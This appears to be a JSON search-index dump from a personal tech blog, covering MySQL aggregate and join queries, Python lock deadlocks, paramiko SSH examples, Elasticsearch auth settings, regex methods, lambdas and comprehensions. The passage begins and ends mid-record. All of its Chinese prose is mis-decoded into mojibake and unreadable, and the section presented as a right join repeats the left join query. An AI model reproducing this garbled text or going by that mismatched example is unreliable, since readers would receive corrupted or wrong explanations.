(44, 86), (77.5, 74), (41, 75), (82, 59.5), (64.5, 85), (62, 98), (44, 36), (67, 56), (81, 90), (78, 70), (83, 66), (40, 90), (90, 90); ","date":"2020-09-21 16:58","objectID":"/post/1996/:0:0","tags":["mysql"],"title":"mysqlæŸ¥è¯¢è¯­å¥","uri":"/post/1996/"},{"categories":["databases"],"content":"ä¸€ã€åŸºæœ¬æŸ¥è¯¢ ","date":"2020-09-21 16:58","objectID":"/post/1996/:1:0","tags":["mysql"],"title":"mysqlæŸ¥è¯¢è¯­å¥","uri":"/post/1996/"},{"categories":["databases"],"content":"èšåˆå‡½æ•°ï¼šå°†ä¸€åˆ—æ•°æ®åšä¸ºä¸€ä¸ªæ•´ä½“,è¿›è¡Œçºµå‘è®¡ç®— count: è®¡ç®—ä¸ªæ•°ï¼Œä¸€èˆ¬é€‰æ‹©éç©ºå­—æ®µ,ä¸»é”® max: æœ€å¤§è¿½ min: æœ€å°å€¼ sum: æ±‚å’Œ avg: å¹³å‡å€¼ group_concat: æŠŠå­—æ®µçš„æ‰€æœ‰å€¼è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²,å¯ä»¥æŒ‡å®šåˆ†å‰²ç¬¦ã€‚é»˜è®¤é€—å· èšåˆå‡½æ•°ä¸ä¼šè®¡ç®—null æ¯”å¦‚select count(description) from student;çš„ç»“æœæ˜¯ä¸åŒ…å«nullçš„ è§£å†³æ–¹æ³•: select count(ifnull(description,â€˜0â€™)) from student; å¦‚æœæ˜¯nullåˆ™è®¾ç½®ä¸€ä¸ªå€¼ ","date":"2020-09-21 16:58","objectID":"/post/1996/:1:1","tags":["mysql"],"title":"mysqlæŸ¥è¯¢è¯­å¥","uri":"/post/1996/"},{"categories":["databases"],"content":"group by: åˆ†ç»„æŸ¥è¯¢ -- æŸ¥è¯¢æ¯ä¸ªåŸå¸‚çš„æ‰€æœ‰äººå‘˜å§“å,äººæ•°,æ€»é‡‘é¢,å¹³å‡é‡‘é¢ -- æŒ‰ç…§åŸå¸‚åˆ†ç»„ select city as 'åŸå¸‚',group_concat(money) as 'é‡‘é¢',group_concat(name) as 'å§“å', count(name) as 'äººæ•°',sum(money) as 'æ€»é‡‘é¢',avg(money) as 'å¹³å‡é‡‘é¢' from student group by city; ","date":"2020-09-21 16:58","objectID":"/post/1996/:1:2","tags":["mysql"],"title":"mysqlæŸ¥è¯¢è¯­å¥","uri":"/post/1996/"},{"categories":["databases"],"content":"order by: æ’åº -- å‡åº select * from student order by money; -- é™åº select * from student order by money desc; ","date":"2020-09-21 16:58","objectID":"/post/1996/:1:3","tags":["mysql"],"title":"mysqlæŸ¥è¯¢è¯­å¥","uri":"/post/1996/"},{"categories":["databases"],"content":"limit: æŸ¥çœ‹å‰å‡ ä¸ªï¼Œoffset: åç§»é‡ -- æŸ¥æ‰¾æœ€æœ‰é’±çš„5ä¸ªäºº select * from student order by money desc limit 5 ; -- å¯ç”¨äºåˆ†é¡µæŸ¥è¯¢ -- ç¬¬3è¡Œå¼€å§‹ï¼Œå¾€åæŸ¥7è¡Œï¼Œä¸åŒ…æ‹¬ç¬¬3è¡Œ select * from student limit 3,7; -- å¯ç”¨äºåˆ†é¡µæŸ¥è¯¢ -- offset=3,å°±æ˜¯ä»ç¬¬3ä¸ªå¼€å§‹æŸ¥ï¼ŒæŸ¥æ‰¾5è¡Œã€‚ä¸åŒ…æ‹¬ç¬¬3è¡Œ select * from student limit 5 offset 3; ","date":"2020-09-21 16:58","objectID":"/post/1996/:1:4","tags":["mysql"],"title":"mysqlæŸ¥è¯¢è¯­å¥","uri":"/post/1996/"},{"categories":["databases"],"content":"distinct: å»é‡ -- æ ¹æ®cityå­—æ®µå»é‡ select distinct city from student; ","date":"2020-09-21 16:58","objectID":"/post/1996/:1:5","tags":["mysql"],"title":"mysqlæŸ¥è¯¢è¯­å¥","uri":"/post/1996/"},{"categories":["databases"],"content":"äºŒã€å¤šè¡¨æŸ¥è¯¢ å›¾è§£: https://www.cnblogs.com/logon/p/3748020.html https://blog.51cto.com/u_13002900/5278688 -- æ·»åŠ æµ‹è¯•æ•°æ® insert into student values(18,\"å°çº¢\",\"å¥³\",\"åŒ—äº¬\",\"å°å­¦ç”Ÿ\",\"1998-05-02\",88,0); insert into student values(19,\"å°è“\",\"ç”·\",\"æ²³åŒ—\",\"å°å­¦å­¦æ¸£\",\"1998-02-07\",86,0); insert into student values(22,\"å°è´¼\",\"ç”·\",\"ä¸œåœŸ\",\"hys\",\"1996-03-02\",11,0); insert into score values(17,82,42); insert into score values(26,45,34); ","date":"2020-09-21 16:58","objectID":"/post/1996/:2:0","tags":["mysql"],"title":"mysqlæŸ¥è¯¢è¯­å¥","uri":"/post/1996/"},{"categories":["databases"],"content":"1. union: è”åˆæŸ¥è¯¢ -- ä¸¤å¼ è¡¨å­—æ®µæ•°é‡è¦ä¸€æ ·ã€‚ä¸¤å¼ è¡¨ä¸Šä¸‹æ‹¼æ¥ select student.id,student.name from student union select score.id,score.math from score; ","date":"2020-09-21 16:58","objectID":"/post/1996/:2:1","tags":["mysql"],"title":"mysqlæŸ¥è¯¢è¯­å¥","uri":"/post/1996/"},{"categories":["databases"],"content":"2. inner join: å†…è¿æ¥(äº¤é›†-ä¸¤å¼ è¡¨éƒ½æœ‰çš„å†…å®¹)ä¹Ÿå¯ç®€å†™join -- å°†student.idã€score.idç›¸ç­‰çš„è®°å½•å·¦å³åˆå¹¶ä¸ºä¸€æ¡ select student.*,score.* from student inner join score on student.id=score.id ; ","date":"2020-09-21 16:58","objectID":"/post/1996/:2:2","tags":["mysql"],"title":"mysqlæŸ¥è¯¢è¯­å¥","uri":"/post/1996/"},{"categories":["databases"],"content":"3. left join: å·¦è¿æ¥ -- å°†student.idã€score.idç›¸ç­‰çš„è®°å½•å·¦å³åˆå¹¶ä¸ºä¸€æ¡ï¼Œä¸ç›¸ç­‰çš„è®°å½•ä»¥å·¦è¡¨ä¸ºå‡†æ˜¾ç¤º,å³è¾¹å­—æ®µä¸ºnull select student.*,score.* from student left join score on student.id=score.id; ","date":"2020-09-21 16:58","objectID":"/post/1996/:2:3","tags":["mysql"],"title":"mysqlæŸ¥è¯¢è¯­å¥","uri":"/post/1996/"},{"categories":["databases"],"content":"3. right join: å·¦è¿æ¥ -- å°†student.idã€score.idç›¸ç­‰çš„è®°å½•å·¦å³åˆå¹¶ä¸ºä¸€æ¡ï¼Œä¸ç›¸ç­‰çš„è®°å½•ä»¥å³è¡¨ä¸ºå‡†æ˜¾ç¤º,å·¦è¾¹å­—æ®µä¸ºnull select student.*,score.* from student left join score on student.id=score.id; å°ç»ƒä¹  -- æŸ¥å‡ºç”·ç”Ÿå¥³ç”Ÿçš„æ•°å­¦è‹±è¯­å¹³å‡åˆ† select student.sex,round(avg(score.math),1),round(avg(score.english),1) from student inner join score on student.id=score.id group by sex; ","date":"2020-09-21 16:58","objectID":"/post/1996/:2:4","tags":["mysql"],"title":"mysqlæŸ¥è¯¢è¯­å¥","uri":"/post/1996/"},{"categories":["databases"],"content":"å­æŸ¥è¯¢","date":"2020-09-21 16:58","objectID":"/post/1996/:3:0","tags":["mysql"],"title":"mysqlæŸ¥è¯¢è¯­å¥","uri":"/post/1996/"},{"categories":["python"],"content":" from threading import Thread, Lock, RLock import time # äº’æ–¥é”æ­»é” # mutexA = Lock() # mutexB = Lock() # class MyThread(Thread): # def run(self): # self.f1() # self.f2() # # def f1(self): # mutexA.acquire() # print(\"%s æ‹¿åˆ°äº†Aé”\" % self.name) # # mutexB.acquire() # print(\"%s æ‹¿åˆ°äº†Bé”\" % self.name) # mutexB.release() # # mutexA.release() # # def f2(self): # mutexB.acquire() # print(\"%s æ‹¿åˆ°äº†Bé”\" % self.name) # time.sleep(0.1) # # mutexA.acquire() # print(\"%s æ‹¿åˆ°äº†Aé”\" % self.name) # mutexA.release() # # mutexB.release() # # # for i in range(4): # t = MyThread() # t.start() # \"\"\" ä¸Šé¢çš„äº’æ–¥é”æ­»é”æµç¨‹ 1ã€ Thread-1 æ‹¿åˆ°äº†Aé” --\u003e Thread-1 æ‹¿åˆ°äº†Bé” --\u003e Thread-1 é‡Šæ”¾Bé” --\u003e Thread-1 é‡Šæ”¾Aé” --\u003e Thread-1 æ‹¿åˆ°äº†Bé” --\u003e sleep (æ­¤æ—¶Aé”å¤„äºé‡Šæ”¾çŠ¶æ€,Bé”è¢«å æœ‰) 2ã€ Thread-2 æ‹¿åˆ°äº†Aé” --\u003e Thread-2éœ€è¦æ‹¿Bé”ï¼Œä½†æ˜¯Bé”åœ¨Thread-1ä¸Š(æ‰€ä»¥æ‹¿ä¸åˆ°),éœ€è¦ç­‰å¾…Thread-1é‡Šæ”¾Bé” 3ã€ Thread-1çš„sleepç»“æŸï¼Œéœ€è¦æ‹¿Aé”ï¼Œä½†æ˜¯Aé”åœ¨Thread-2ä¸Š(æ‰€ä»¥æ‹¿ä¸åˆ°),éœ€è¦ç­‰å¾…Thread-2é‡Šæ”¾Aé” Thread-1å’ŒThread-2éƒ½åœ¨ç­‰å¾…å¯¹æ–¹é‡Šæ”¾é”ï¼Œæ‰€ä»¥é”æ­»äº†.è§£å†³ä¸Šé¢çš„é—®é¢˜éœ€è¦ç”¨åˆ°é€’å½’é”RLock [Thread-1æ‹¿åˆ°Bé”ï¼Œæƒ³è¦æ‹¿Aé”ï¼ŒThread-2æ‹¿ç€Aé”ï¼Œæƒ³è¦Bé”] \"\"\" ########################################################################################## \"\"\" é€’å½’é”ï¼š é€’å½’é”åŒä¸€æ—¶åˆ»åªèƒ½è¢«ä¸€ä¸ªçº¿ç¨‹å ç”¨ï¼Œä¸€ä¸ªçº¿ç¨‹å¯ä»¥acquireå¤šæ¬¡ã€‚ é€’å½’é”æœ‰ä¸€ä¸ªåˆå§‹è®¡æ•°å™¨,å€¼ä¸º0,æ¯æ¬¡acquireè®¡æ•°å™¨å°±ä¼šåŠ 1,æ¯æ¬¡releaseå°±å‡1,è®¡æ•°å™¨ä¸º0æ‰ä¼šé‡Šæ”¾é”. åªæœ‰å®ƒçš„è®¡æ•°ä¸º0çš„æ—¶å€™,æ‰èƒ½è¢«åˆ«çš„çº¿ç¨‹æŠ¢å¤º.æ‰€ä»¥åœ¨é”å®Œå…¨é‡Šæ”¾ä¹‹å‰ï¼Œä¸ä¼šè¢«å…¶ä»–çº¿ç¨‹æŠ¢èµ°ï¼Œå°±ä¸ä¼šå­˜åœ¨æ­»é”çš„é—®é¢˜äº†ã€‚ \"\"\" # é€’å½’é” mutexA = mutexB = RLock() class MyThread(Thread): def run(self): self.f1() self.f2() def f1(self): mutexA.acquire() print(\"%s æ‹¿åˆ°äº†Aé”\" % self.name) mutexB.acquire() print(\"%s æ‹¿åˆ°äº†Bé”\" % self.name) mutexB.release() mutexA.release() def f2(self): mutexB.acquire() print(\"%s æ‹¿åˆ°äº†Bé”\" % self.name) time.sleep(0.1) mutexA.acquire() print(\"%s æ‹¿åˆ°äº†Aé”\" % self.name) mutexA.release() mutexB.release() for i in range(4): t = MyThread() t.start() \"\"\" ä¸Šçœ‹çš„æ“ä½œå…¶å®å°±æ˜¯ä¸€æŠŠé”ï¼Œåªä¸è¿‡æœ‰ä¸¤ä¸ªåå­— \"\"\" ","date":"2020-09-16 11:22","objectID":"/post/1992/:0:0","tags":["python"],"title":"python-äº’æ–¥é”æ­»é”ä¸é€’å½’é”","uri":"/post/1992/"},{"categories":["python"],"content":" # -*- coding: utf-8 -*- import paramiko # é€šè¿‡ç”¨æˆ·åå¯†ç è¿æ¥ # # åˆ›å»ºsshå®¢æˆ·ç«¯ # ssh_client = paramiko.SSHClient() # # è‡ªåŠ¨åŒæ„yes # ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy) # # å»ºç«‹è¿æ¥ # ssh_client.connect(hostname=\"10.0.0.237\", username=\"root\", password=\"123\", timeout=3) # # æ‰§è¡Œå‘½ä»¤ # stdin, stdout, stderr = ssh_client.exec_command('read -p \"å†…å®¹:\" a ; echo $a') # # æ ‡å‡†è¾“å…¥ï¼Œå®ç°è¿œç«¯äº¤äº’ # # stdin.write(\"ç»™readçš„å†…å®¹\\n\") # stdin.write(input(\"ä½ è¾“å…¥ä»€ä¹ˆæˆ‘å°±è¿”å›ä»€ä¹ˆï¼š\") + \"\\n\") # print(stdout.read().decode(\"utf8\")) # ssh_client.close() # é€šè¿‡ç§é’¥è¿æ¥ # ssh_client = paramiko.SSHClient() # private_key = paramiko.RSAKey.from_private_key_file(\"./id_dsa\") # ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy) # ssh_client.connect(hostname=\"10.0.0.200\", username=\"root\",pkey=private_key) # stdin, stdout, stderr = ssh_client.exec_command('read -p \"å†…å®¹:\" a ; echo $a') # stdin.write(\"æˆ‘è¾“å…¥çš„å†…å®¹\\n\") # print(stdout.read().decode()) # ssh_client.close() # sftpä¼ è¾“æ–‡ä»¶ # transport = paramiko.Transport((\"10.0.0.200\",22)) # transport.connect(username=\"root\",password=\"123\") # sftp_client = paramiko.SFTPClient.from_transport(transport) # sftp_client.get('/root/init.sh','./aa.s1h') # sftp_client.put('./mem.py','mem.py') # sftp_client.close() ","date":"2020-09-16 10:14","objectID":"/post/1991/:0:0","tags":["python"],"title":"python-paramikoç®€å•ä½¿ç”¨","uri":"/post/1991/"},{"categories":["databases","ELKæ—¥å¿—æ”¶é›†"],"content":"é…ç½®æ–‡ä»¶ cluster.name: test xpack.security.enabled: true discovery.type: single-node node.name: node1 path.data: /data/ path.logs: /usr/local/es/logs bootstrap.memory_lock: true network.host: 0.0.0.0 http.port: 9200 ","date":"2020-09-14 18:18","objectID":"/post/1990/:1:0","tags":["elasticsearch"],"title":"elasticsearchå¼€å¯basicauthè®¤è¯","uri":"/post/1990/"},{"categories":["databases","ELKæ—¥å¿—æ”¶é›†"],"content":"å¯åŠ¨æœåŠ¡ /usr/local/es/bin/elasticsearch -d ","date":"2020-09-14 18:18","objectID":"/post/1990/:2:0","tags":["elasticsearch"],"title":"elasticsearchå¼€å¯basicauthè®¤è¯","uri":"/post/1990/"},{"categories":["databases","ELKæ—¥å¿—æ”¶é›†"],"content":"è®¾ç½®å¯†ç  /usr/local/es/bin/elasticsearch-setup-passwords interactive ","date":"2020-09-14 18:18","objectID":"/post/1990/:3:0","tags":["elasticsearch"],"title":"elasticsearchå¼€å¯basicauthè®¤è¯","uri":"/post/1990/"},{"categories":["python"],"content":"å¸¸ç”¨çš„æ ‡å¿—ä½: re.M å¤šè¡ŒåŒ¹é… re.S è®©.å¯ä»¥åŒ¹é…æ¢è¡Œç¬¦ re.I å¿½ç•¥å¤§å°å†™ ä½¿ç”¨å¤šä¸ªæ ‡å¿—ä½å¯ä»¥ç”¨or,|ã€‚ä¾‹å¦‚re.search(râ€™xxxâ€™, s2, re.S|re.I) # # re.S:è®©\".\"å¯ä»¥åŒ¹é…æ¢è¡Œç¬¦ # s2 = \"soul\\nchild\" # m5 = re.search(r'l.c', s2, re.S) # print(m5) # # print(m5.groups()) ################################################################## # æ­£å¸¸æƒ…å†µä¸‹ï¼Œå¤šè¡Œå­—ç¬¦ä¸²ä¼šè¢«å½“ä½œä¸€ä¸ªæ•´ä½“ã€‚ # re.Mï¼šå¼€å¯å¤šè¡ŒåŒ¹é…ï¼Œä¸€è¡Œä¸€ä¸ªæ•´ä½“,ä¼šå½±å“^å’Œ$ã€‚ s3 = \"\"\"00 74 28 99 387\"\"\" # # åŒ¹é…ä»¥æ•°å­—å¼€å¤´çš„å†…å®¹ # m6 = re.findall(r'^\\d+', s3) # # é»˜è®¤åªèƒ½åŒ¹é…ä¸€ä¸ª00 # print(m6) # ['00'] # # å¼€å¯å¤šè¡ŒåŒ¹é… # m6 = re.findall(r'^\\d+', s3, re.M) # print(m6) # ['00', '28', '387'] # åŒ¹é…ä»¥æ•°å­—ç»“å°¾çš„å†…å®¹ # # é»˜è®¤åªèƒ½åŒ¹é…ä¸€ä¸ª387 # m6 = re.findall(r'\\d+$', s3) # print(m6) # ['387'] # # å¼€å¯å¤šè¡ŒåŒ¹é… # m6 = re.findall(r'\\d+$', s3, re.M) # print(m6) # ['74', '99', '387'] ","date":"2020-09-13 23:25","objectID":"/post/1986/:0:0","tags":["python"],"title":"python-reæ­£åˆ™ä¿®é¥°ç¬¦","uri":"/post/1986/"},{"categories":["python"],"content":" import re s = '''href=\"https://soulchild.cn/1976.html\"\u003epython-lambdaåŒ¿åå‡½æ•°\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://soulchild.cn/1974.html\"\u003epython-ä¸‰å…ƒè¡¨è¾¾å¼ã€åˆ—è¡¨å­—å…¸é›†åˆæ¨å¯¼å¼ã€ç”Ÿæˆå™¨è¡¨è¾¾å¼\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://soulchild.cn/1971.html\"\u003eprometheus-é…ç½®æ–‡ä»¶-rules(ä¸‰)\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://soulchild.cn/1965.html\"\u003eprometheus-é…ç½®æ–‡ä»¶-scrape_configsã€relabel_configç­‰æŠ“å–ç›¸å…³é…ç½®(äºŒ)\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://soulchild.cn/1963.html\"\u003eprometheus-é…ç½®æ–‡ä»¶-globalã€rule_filesã€remote_read|write(ä¸€)\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://soulchild.cn/1962.html\"\u003eprometheus-äºŒè¿›åˆ¶éƒ¨ç½²\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://soulchild.cn/1958.html\"\u003eprometheus-æŒ‡æ ‡ç±»å‹\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://soulchild.cn/1956.html\"\u003epython-å­—ç¬¦ä¸²æ ¼å¼åŒ–\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://soulchild.cn/1951.html\"\u003epython-å­—ç¬¦ä¸²åŸºæœ¬æ“ä½œ\u003c/a\u003e\u003c/li\u003e ''' # match############################################################################# # # ä»å¼€å¤´åŒ¹é…(æ­£åˆ™ä¸€å®šè¦åŒ¹é…åˆ°æ–‡æœ¬çš„å¼€å¤´éƒ¨åˆ†ï¼Œå¦åˆ™åŒ¹é…å¤±è´¥),åªåŒ¹é…ä¸€æ¬¡ # m1 = re.match(r'href=\"(?P\u003curl\u003e.*?)\"\u003e(?P\u003ctitle\u003e.*?)\u003c/', s) # # è¿”å›æ‰¾åˆ°çš„å­—ç¬¦ä¸²ä½ç½®(èµ·å§‹,ç»“æŸ) # print(m1.span()) # è¿”å›åŒ¹é…åˆ°çš„ç¬¬ä¸€ä¸ªåˆ†ç»„çš„èµ·å§‹å’Œç»“æŸä½ç½® # print(m1.span(1)) # # # è·å–åŒ¹é…çš„ç»“æœ.0ä»£è¡¨åŒ¹é…çš„æ•´ä½“å†…å®¹ï¼Œ1æ˜¯ç¬¬ä¸€ä¸ªåˆ†ç»„ï¼Œå³ç¬¬ä¸€ä¸ªæ‹¬å·å†…åŒ¹é…åˆ°çš„å†…å®¹ # print(m1.group(0)) # print(m1.group(1)) # print(m1.group(2)) # # # å…ƒç»„çš„å½¢å¼ä¸€æ¬¡æ€§å±•ç°åŒ¹é…çš„å…¨éƒ¨å†…å®¹ # print(m1.groups(\"a\")) # # # å­—å…¸çš„å½¢å¼å±•ç°åŒ¹é…çš„å†…å®¹ã€‚éœ€è¦åˆ†ç»„ä¸­æŒ‡å®šåç§°,æ ¼å¼ä¸º(?P\u003ckey\u003epattern) # print(m1.groupdict()) # search############################################################################# # åªæŸ¥æ‰¾ä¸€æ¬¡(å’Œä¸Šé¢çš„åŒºåˆ«æ˜¯ä¸ç”¨å¿…é¡»åŒ¹é…å¼€å¤´çš„éƒ¨åˆ†) # m2 = re.search(r'(?P\u003curl\u003ehttp.*?)\"\u003e(?P\u003ctitle\u003e.*?)\u003c/', s) # ç”¨æ³•å’Œmatchä¸€è‡´ # print(m2.groups()) # findall############################################################################# # re.findall() ç›´æ¥è¿”å›åŒ¹é…åˆ°çš„å†…å®¹åˆ—è¡¨ # m3 = re.findall(r'(?P\u003curl\u003ehttp.*?)\"\u003e(?P\u003ctitle\u003e.*?)\u003c/', s) # # ç›´æ¥è¿”å›åŒ¹é…åˆ°çš„å†…å®¹åˆ—è¡¨ # print(m3) # finditer############################################################################# # re.finditer() è¿”å›åŒ¹é…åˆ°çš„matchå¯¹è±¡,è¿­ä»£å™¨å½¢å¼ m4 = re.finditer(r'(?P\u003curl\u003ehttp.*?)\"\u003e(?P\u003ctitle\u003e.*?)\u003c/', s) # matchå¯¹è±¡çš„æ“ä½œæ–¹æ³•ï¼Œå‚è€ƒre.match print(next(m4).groups()) # sub############################################################################# # æ›¿æ¢å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šæ›¿æ¢æ¬¡æ•° # res = re.sub(r'http.*?html', \"æ›¿æ¢é“¾æ¥\", s) # print(res) # è¿˜å¯ä»¥å¯¹åŒ¹é…åˆ°çš„å†…å®¹åšå¤„ç†åå†è¿›è¡Œæ›¿æ¢ # å°†åŒ¹é…åˆ°çš„å†…å®¹ä¼ ç»™lambdaå‡½æ•°,åˆ‡å‰²å‡ºæŒ‡å®šéƒ¨åˆ†åœ¨æ›¿æ¢ res = re.sub(r'http.*?html', lambda x: \"/\" + x.group().rsplit('/')[-1], s) print(res) # compile####################################################################################### # compileå¯ä»¥å®ç°ä¸€ä¸ªæ­£åˆ™å¤šæ¬¡å¤ç”¨ # ä½¿ç”¨æŒ‡å®šçš„è¡¨è¾¾å¼ç”Ÿæˆä¸€ä¸ªè¡¨è¾¾å¼å¯¹è±¡ p1 = re.compile(r'(?P\u003curl\u003ehttp.*?)\"\u003e(?P\u003ctitle\u003e.*?)\u003c/') # ä½¿ç”¨è¿™ä¸ªè¡¨è¾¾å¼å¯¹è±¡æ¥åŒ¹é…æ–‡æœ¬ã€‚ print(p1.findall(s)) s2 = 'http://soulchild.cn\"\u003eé˜¿å°±æ˜¯çœ‹åˆ°ä½ å®¶\u003c/' print(p1.search(s2).groups()) ","date":"2020-09-13 23:09","objectID":"/post/1984/:0:0","tags":["python"],"title":"python-reæ¨¡å—å¸¸ç”¨æ–¹æ³•","uri":"/post/1984/"},{"categories":["python"],"content":" |________|_________|____________|________|______| { å·¦è¾¹æ–‡æœ¬ } {å³è¾¹æ–‡æœ¬} def get_mid_str(s, start_str, stop_str): # æŸ¥æ‰¾å·¦è¾¹æ–‡æœ¬çš„ç»“æŸä½ç½® start_pos = s.find(start_str) if start_pos == -1: return None start_pos += len(start_str) # æŸ¥æ‰¾å³è¾¹æ–‡æœ¬çš„èµ·å§‹ä½ç½® stop_pos = s.find(stop_str, start_pos) if stop_pos == -1: return None # é€šè¿‡åˆ‡ç‰‡å–å‡ºä¸­é—´çš„æ–‡æœ¬ return s[start_pos:stop_pos] txt = r'''\u003ch2 class=\"post-title\" itemprop=\"name headline\"\u003e \u003ca itemtype=\"url\" href=\"https://soulchild.cn/1971.html\"\u003e prometheus-é…ç½®æ–‡ä»¶-rules(ä¸‰)\u003c/a\u003e\u003c/h2\u003e ''' print(get_mid_str(txt, 'href=\"', '\"\u003e')) ","date":"2020-09-09 17:00","objectID":"/post/1980/:0:0","tags":["python"],"title":"python-å–å‡ºä¸­é—´çš„æ–‡æœ¬","uri":"/post/1980/"},{"categories":["java"],"content":"https://adoptopenjdk.net/ ","date":"2020-09-09 13:41","objectID":"/post/2758/:0:0","tags":["java"],"title":"adoptopenjdk","uri":"/post/2758/"},{"categories":["python"],"content":"lambdaåŒ¿åå‡½æ•°: ä¸€èˆ¬ç”¨äºå°†è‡ªèº«åšä¸ºå‚æ•°ä¼ é€’ç»™å¦ä¸€ä¸ªå‡½æ•° ","date":"2020-09-06 17:37","objectID":"/post/1976/:1:0","tags":["python"],"title":"python-lambdaåŒ¿åå‡½æ•°","uri":"/post/1976/"},{"categories":["python"],"content":"è¯­æ³•: lambda å‚æ•°:è¿”å›å€¼ ","date":"2020-09-06 17:37","objectID":"/post/1976/:1:1","tags":["python"],"title":"python-lambdaåŒ¿åå‡½æ•°","uri":"/post/1976/"},{"categories":["python"],"content":"1.è®¡ç®—ä¸€ä¸ªåˆ—è¡¨ä¸­æ¯ä¸ªå…ƒç´ çš„å¹³æ–¹ x = list(map(lambda n: n ** 2, [i for i in range(10)])) print(x) [0, 1, 4, 9, 16, 25, 36, 49, 64, 81] ","date":"2020-09-06 17:37","objectID":"/post/1976/:1:2","tags":["python"],"title":"python-lambdaåŒ¿åå‡½æ•°","uri":"/post/1976/"},{"categories":["python"],"content":"2.å¤šä¸ªå‚æ•°çš„æ—¶å€™ x = list(map(lambda n, z: n ** 2 + z, [i for i in range(10)], [1, 2, 3])) print(x) [1, 3, 7] mapå‚æ•°1æŒ‡å®šä¸€ä¸ªå‡½æ•°ï¼Œåé¢çš„å…¶ä»–å‚æ•°ä¸ºå¯è¿­ä»£å¯¹è±¡ã€‚å¯è¿­ä»£å¯¹è±¡çš„æ¯ä¸ªå…ƒç´ ä¼šåšä¸ºå‚æ•°ä¼ é€’ç»™å‚æ•°1æŒ‡å®šçš„å‡½æ•°ã€‚åé¢å¯ä»¥æŒ‡å®šå¤šä¸ªå¯è¿­ä»£å¯¹è±¡ï¼Œæ¯ä¸ªå¯è¿­ä»£å¯¹è±¡ä¼šæœ‰ä¸ªæ˜ å°„å…³ç³» ä¸Šé¢çš„å‡½æ•°ä¸­range(10)ï¼š[0,1,2,3,4,5,6,7,8,9]å’Œ[1,2,3]çš„æ˜ å°„å…³ç³»å°±æ˜¯(0,1),(1,2),(2,3) åˆ†ä¸‰æ¬¡æ‰§è¡Œlambdaå‡½æ•°ã€‚å‰é¢çš„å€¼å°±æ˜¯nï¼Œåé¢çš„å€¼å°±æ˜¯z ç›¸å½“äº0 ** 2 + 1â€”-\u003e 1 ** 2 + 2 â€”-\u003e2 ** 2 + 3 å¯ä»¥çœ‹ä¸‹ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼š x = list(map(lambda n, z: (n, z), [\"a\", \"b\", \"c\"], [1, 2, 3])) print(x) [('a', 1), ('b', 2), ('c', 3)] ","date":"2020-09-06 17:37","objectID":"/post/1976/:1:3","tags":["python"],"title":"python-lambdaåŒ¿åå‡½æ•°","uri":"/post/1976/"},{"categories":["python"],"content":"3.æŒ‰ç…§æŒ‡å®šçš„å…ƒç´ è¿›è¡Œåˆ—è¡¨æ’åº info = [{\"name\": \"jack\", \"age\": 18}, {\"name\": \"soul\", \"age\": 16}, {\"name\": \"tony\", \"age\": 20}] info.sort(key=lambda x: x['age']) print(info) [{'name': 'soul', 'age': 16}, {'name': 'jack', 'age': 18}, {'name': 'tony', 'age': 20}] ","date":"2020-09-06 17:37","objectID":"/post/1976/:1:4","tags":["python"],"title":"python-lambdaåŒ¿åå‡½æ•°","uri":"/post/1976/"},{"categories":["python"],"content":"4.åˆ—è¡¨è¿‡è¿‡æ»¤ ages = [87, 71, 12, 18, 1, 24, 68, 10] print(list(filter(lambda x: x \u003e 12, ages))) [87, 71, 18, 24, 68] filterå‚æ•°1æŒ‡å®šä¸€ä¸ªå‡½æ•°ï¼Œå‚æ•°2ï¼šå¯è¿­ä»£å¯¹è±¡ã€‚å¯è¿­ä»£å¯¹è±¡çš„æ¯ä¸ªå…ƒç´ ä¼šåšä¸ºå‚æ•°ä¼ é€’ç»™å‚æ•°1æŒ‡å®šçš„å‡½æ•°ï¼Œå‚æ•°1çš„å‡½æ•°è¿”å›å€¼ä¸ºTrueæ—¶,å°±ä¿ç•™è¿™ä¸ªå…ƒç´ ï¼Œå¦åˆ™ä¼šä¸¢å¼ƒã€‚ ","date":"2020-09-06 17:37","objectID":"/post/1976/:1:5","tags":["python"],"title":"python-lambdaåŒ¿åå‡½æ•°","uri":"/post/1976/"},{"categories":["python"],"content":"1.ä¸‰å…ƒè¡¨è¾¾å¼: ifæˆç«‹è¿”å›å·¦è¾¹çš„å€¼(1)ï¼Œä¸æˆç«‹è¿”å›å³è¾¹çš„å€¼(0) x = \"\\n\" print(1 if x == \"\\n\" else 0) Out: 1 ","date":"2020-09-05 16:12","objectID":"/post/1974/:1:0","tags":["python"],"title":"python-ä¸‰å…ƒè¡¨è¾¾å¼ã€åˆ—è¡¨å­—å…¸é›†åˆæ¨å¯¼å¼ã€ç”Ÿæˆå™¨è¡¨è¾¾å¼","uri":"/post/1974/"},{"categories":["python"],"content":"2.åˆ—è¡¨æ¨å¯¼å¼ nums = [i for i in range(0, 10)] print(nums) [0, 1, 2, 3, 4, 5, 6, 7, 8, 9] nums = [i for i in range(0, 10) if i \u003e 5] print(nums) [6, 7, 8, 9] nums = [(i, k) for i in range(0, 2) for k in range(1, 4)] print(nums) [(0, 1), (0, 2), (0, 3), (1, 1), (1, 2), (1, 3)] ","date":"2020-09-05 16:12","objectID":"/post/1974/:2:0","tags":["python"],"title":"python-ä¸‰å…ƒè¡¨è¾¾å¼ã€åˆ—è¡¨å­—å…¸é›†åˆæ¨å¯¼å¼ã€ç”Ÿæˆå™¨è¡¨è¾¾å¼","uri":"/post/1974/"},{"categories":["python"],"content":"3.é›†åˆæ¨å¯¼å¼ é›†åˆå’Œå­—å…¸ä¸€æ ·,æŠŠ[]æ¢æˆ{} nums = {i for i in range(0, 10)} print(nums) {0, 1, 2, 3, 4, 5, 6, 7, 8, 9} nums = {i for i in range(0, 10) if i \u003e 5} print(nums) {8, 9, 6, 7} nums = {(i, k) for i in range(0, 2) for k in range(1, 4)} print(nums) {(0, 1), (1, 2), (1, 3), (0, 2), (0, 3), (1, 